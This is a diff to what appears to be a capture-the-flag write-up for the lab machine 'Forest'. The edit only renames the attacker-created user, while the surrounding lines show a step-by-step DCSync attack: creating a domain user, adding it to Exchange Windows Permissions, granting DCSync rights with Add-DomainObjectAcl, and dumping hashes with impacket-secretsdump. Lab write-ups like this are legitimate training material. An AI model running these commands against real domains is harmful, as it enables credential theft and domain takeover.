@@ -300,14 +300,14 @@ on the windows abuse tab it shows how to perform this dcsync attack step by step
 to perform this attack first I'll create a new user on the domain 
 
 ```bash
-*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bh> net user wxrdcn password123 /add /domain
+*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bh> net user s3ntrysec password123 /add /domain
 The command completed successfully.
 ```
 
 first if I try secretsdump with the user I created, this gives an access denied error but when the dcsync attack is performed I will be able to see the hashes from another users
 
 ```bash
-$ impacket-secretsdump htb.local/wxrdcn:password123@10.10.10.161
+$ impacket-secretsdump htb.local/s3ntrysec:password123@10.10.10.161
 Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 
 [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
@@ -330,10 +330,10 @@ to do this first I have to add then new user to the group exchange windows permi
 *Exchange Windows Permissions
 *ExchangeLegacyInterop
 
-*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bh> net group "Exchange Windows Permissions" wxrdcn /add
+*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bh> net group "Exchange Windows Permissions" s3ntrysec /add
 The command completed successfully.
 
-*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bh> net user wxrdcn | findstr "Exchange Windows Permissions"
+*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bh> net user s3ntrysec | findstr "Exchange Windows Permissions"
 Global Group memberships     *Exchange Windows Perm*Domain Users
 ```
 
@@ -352,21 +352,21 @@ Then following the guide that bloodhound shows I'll abuse the write dacl permiss
 
 ```
 *Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bh> $SecPassword = ConvertTo-SecureString 'password123' -AsPlainText -Force
-*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bh> $Cred = New-Object System.Management.Automation.PSCredential('HTB.LOCAL\wxrdcn', $SecPassword)
+*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bh> $Cred = New-Object System.Management.Automation.PSCredential('HTB.LOCAL\s3ntrysec', $SecPassword)
 
 ```
 
 the last part gives a bit of a problem to solve it is just define the dc as "DC=htb,DC=local" and the parameter PrincipalIdentity user to define the user that will receive this privilege
 
 ```
-*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bh> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity wxrdcn -Right
+*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bh> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity s3ntrysec -Right
 s DCSync
 ```
 
 after doing this now I can retrieve the hashes of other users such as administrator
 
 ```
-$ impacket-secretsdump htb.local/wxrdcn:password123@10.10.10.161
+$ impacket-secretsdump htb.local/s3ntrysec:password123@10.10.10.161
 Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 
 [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
